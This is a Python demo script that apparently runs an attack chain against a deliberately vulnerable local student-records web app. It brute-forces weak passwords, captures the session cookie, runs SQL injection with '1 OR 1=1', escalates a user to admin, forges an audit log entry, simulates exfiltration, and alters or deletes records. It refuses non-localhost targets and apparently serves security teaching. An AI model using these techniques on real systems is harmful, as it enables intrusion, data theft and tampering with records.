import argparse
import json
from http.cookies import SimpleCookie

import requests


PASSWORDS = ["1234", "admin", "welcome1", "password", "password123", "admin123"]


def print_step(title):
    print(f"\n=== {title} ===")


def cookie_snapshot(session):
    return {cookie.name: cookie.value for cookie in session.cookies}


def brute_force(base_url, username):
    print_step("1. Brute-force weak credentials")
    session = requests.Session()

    for password in PASSWORDS:
        response = session.post(
            f"{base_url}/login",
            data={"username": username, "password": password},
            allow_redirects=False,
            timeout=10,
        )
        success = response.status_code in (302, 303) and "/dashboard" in response.headers.get("Location", "")
        print(f"try password={password!r} status={response.status_code} success={success}")
        if success:
            print(f"compromised account: {username}:{password}")
            print(f"captured cookies: {json.dumps(cookie_snapshot(session), indent=2)}")
            return session, password

    raise RuntimeError("No password matched the demo wordlist. Reload db/init.sql seed data.")


def show_session(base_url, session):
    print_step("2. Session cookie evidence")
    response = session.get(f"{base_url}/demo/session", timeout=10)
    print(json.dumps(response.json(), indent=2))
    raw_cookie = session.cookies.get("session")
    if raw_cookie:
        parsed = SimpleCookie()
        parsed.load(f"session={raw_cookie}")
        print(f"reusable Flask cookie value: {parsed['session'].value}")


def sql_injection(base_url, session):
    print_step("3. Authenticated SQL injection")
    payload = "1 OR 1=1"
    response = session.get(f"{base_url}/api/student", params={"id": payload}, timeout=10)
    response.raise_for_status()
    records = response.json()
    print(f"payload: {payload}")
    print(f"records returned: {len(records)}")
    print(json.dumps(records, indent=2))
    return records


def escalate_role(base_url, session, username):
    print_step("4. Broken access control and role escalation")
    response = session.post(
        f"{base_url}/api/change_role",
        data={"username": username, "role": "admin"},
        timeout=10,
    )
    print(f"role change status={response.status_code} body={response.text!r}")
    refreshed = session.get(f"{base_url}/dashboard", timeout=10)
    print(f"dashboard after escalation status={refreshed.status_code} admin_panel_visible={'Account Administration' in refreshed.text}")


def inject_logs(base_url):
    print_step("5. Log injection")
    payload_username = "analyst\\n[ADMIN ACTION] Audit trail manually cleared"
    response = requests.post(
        f"{base_url}/login",
        data={"username": payload_username, "password": "wrong"},
        timeout=10,
    )
    print(f"submitted forged username status={response.status_code}")
    logs = requests.get(f"{base_url}/demo/recent-logs", params={"limit": 8}, timeout=10).json()
    print(json.dumps(logs, indent=2))


def exfiltrate(base_url, session, records):
    print_step("6. Simulated local exfiltration")
    response = session.post(f"{base_url}/demo/exfiltrate", json={"records": records}, timeout=10)
    print(json.dumps(response.json(), indent=2))


def destructive_impact(base_url, session):
    print_step("7. Integrity impact")
    update = session.post(
        f"{base_url}/api/update_marks",
        data={"id": "1", "marks": "100"},
        timeout=10,
    )
    delete = session.post(
        f"{base_url}/api/delete_student",
        data={"id": "6"},
        timeout=10,
    )
    count = session.get(f"{base_url}/demo/student-count", timeout=10)
    print(f"update marks status={update.status_code} body={update.text!r}")
    print(f"delete student status={delete.status_code} body={delete.text!r}")
    print(f"remaining student count={count.json().get('count')}")


def main():
    parser = argparse.ArgumentParser(description="Run the authorized localhost attack-chain demo.")
    parser.add_argument("--base-url", default="http://localhost:5000")
    parser.add_argument("--username", default="alice")
    parser.add_argument("--skip-destructive", action="store_true")
    args = parser.parse_args()

    if not args.base_url.startswith(("http://localhost", "http://127.0.0.1")):
        raise SystemExit("This demo runner is intentionally limited to localhost targets.")

    session, _password = brute_force(args.base_url, args.username)
    show_session(args.base_url, session)
    records = sql_injection(args.base_url, session)
    escalate_role(args.base_url, session, args.username)
    inject_logs(args.base_url)
    exfiltrate(args.base_url, session, records)

    if args.skip_destructive:
        print_step("7. Integrity impact skipped")
        print("Run without --skip-destructive to update marks and delete one seeded record.")
    else:
        destructive_impact(args.base_url, session)


if __name__ == "__main__":
    main()
